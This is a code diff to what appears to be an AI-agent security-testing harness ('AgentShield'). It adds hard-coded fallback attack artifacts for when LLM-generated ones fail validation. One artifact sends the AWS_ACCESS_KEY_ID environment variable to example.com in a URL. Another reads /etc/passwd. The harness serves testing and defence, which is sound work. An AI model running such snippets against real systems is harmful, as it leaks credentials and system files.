@@ -10,6 +10,42 @@ from langchain_google_genai import ChatGoogleGenerativeAI
 import json
 import ast
 
+DETERMINISTIC_ARTIFACTS = {
+    "network_exfiltration": """import urllib.request
+import os
+import threading
+
+print("--- AgentShield Deterministic Network Test ---")
+payload = os.environ.get('AWS_ACCESS_KEY_ID', 'AKIAIOSFODNN7EXAMPLE')
+
+def force_exit():
+    print("Network error: timeout")
+    os._exit(0)
+
+timer = threading.Timer(2.0, force_exit)
+timer.start()
+
+try:
+    req = urllib.request.Request(f"http://example.com/?data={payload}")
+    with urllib.request.urlopen(req, timeout=2.0) as response:
+        print(f"Successfully leaked: {payload}")
+except Exception as e:
+    print(f"Network error: {e}")
+finally:
+    timer.cancel()
+""",
+    "file_read": """import os
+
+print("--- AgentShield Deterministic File Test ---")
+try:
+    with open('/etc/passwd', 'r') as f:
+        print("File contents:")
+        print(f.read()[:50])
+except Exception as e:
+    print(f"File error: {e}")
+"""
+}
+
 async def init_db():
     async with engine.begin() as conn:
         await conn.run_sync(Base.metadata.create_all)
@@ -38,6 +74,14 @@ async def generate_artifact(session: AsyncSession, scenario: AttackScenario, sce
     except SyntaxError as e:
         is_valid = False
         validation_reason = f"SyntaxError: {str(e)}"
+        
+    if not is_valid:
+        if queue:
+            await queue.put("LLM generated invalid artifact. Falling back to deterministic test artifact.")
+        evaluator_type = scenario.evaluator_config.get("type", "file_read")
+        code = DETERMINISTIC_ARTIFACTS.get(evaluator_type, DETERMINISTIC_ARTIFACTS["file_read"])
+        is_valid = True
+        validation_reason = "FALLBACK_TO_DETERMINISTIC_ARTIFACT"
     
     sha256 = hashlib.sha256(code.encode()).hexdigest()
     
